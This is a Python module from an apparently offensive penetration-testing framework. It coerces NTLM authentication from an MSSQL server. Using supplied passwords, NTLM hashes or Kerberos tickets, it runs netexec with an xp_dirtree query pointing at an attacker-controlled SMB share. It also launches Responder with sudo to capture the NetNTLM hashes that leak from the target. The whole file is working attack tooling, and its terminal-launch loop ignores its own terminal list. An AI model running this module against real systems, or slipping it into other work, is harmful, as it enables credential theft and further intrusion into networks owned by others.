from pathlib import Path
from datetime import datetime
import subprocess

from core.paths import get_chain_artifacts_dir
from core.attacker import resolve_lhost

def run(data, cred, args):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    if not cred:

        print(
            f"\n{R}[!] {W}{BOLD}NO CREDENTIAL SELECTED{W}\n"
        )

        return data

    target = data.get("ip")

    lhost = resolve_lhost(args)

    if not lhost:

        print(
            f"\n{R}[!] {W}No LHOST configured\n"
        )

        return data

    username = cred["user"]
    auth_type = cred["type"]
    secret = cred["secret"]

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "mssql"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )


    query = (
        f"EXEC master..xp_dirtree "
        f"'\\\\{lhost}\\share\\';"
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: MSSQL NTLM{W}{B} ───────────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Target:{W} "
        f"{C}{target:<32}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}User:{W}   "
        f"{C}{username:<32}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}SMB:{W}    "
        f"{C}{lhost:<32}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└────────────────────────────────────────────────────┘{W}"
    )

    answer = input(
        "Start Responder? [Y/n]: "
    )

    if answer.lower() in ["", "y", "yes"]:

        launched = False

        terminals = [
            [
                "kitty",
                "--hold",
                "bash",
                "-c",
                "sudo responder -I tun0"
            ],
            [
                "gnome-terminal",
                "--",
                "bash",
                "-c",
                "sudo responder -I tun0; exec bash"
            ]
        ]

        for terminal in terminals:

            try:

                subprocess.Popen(
                    [
                        "x-terminal-emulator",
                        "-e",
                        "bash",
                        "-c",
                        "sudo responder -I tun0; exec bash"
                    ]
                )

                launched = True

                break

            except Exception:
                pass

        if launched:

            print(
                f"\n{G}[+] {W}Responder Started\n"
            )

        else:

            print(
                f"\n{Y}[-]{W} Could not launch terminal"
            )

            print(
                f"{Y}sudo responder -I tun0{W}\n"
            )

    cmd = [
        "netexec",
        "mssql",
        target,
        "-u",
        username,
        "--local-auth",
        "-q",
        query,
    ]

    if auth_type == "password":

        cmd.extend(
            [
                "-p",
                secret
            ]
        )

    elif auth_type == "ntlm":

        cmd.extend(
            [
                "-H",
                secret
            ]
        )

    elif auth_type == "ticket":

        cmd.append(
            "--use-kcache"
        )

    print(
        f"{B}[*]{W} Running\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    result = subprocess.run(
        cmd,
        text=True,
        capture_output=True
    )

    print(
        result.stdout
    )

    if result.stderr:

        print(
            result.stderr
        )

    print(
        f"\n{G}[+] {W}Query Executed\n"
    )


    print(
        f"{Y}[!]{W} Watch Responder for captured NetNTLM hashes\n"
    )

    return data
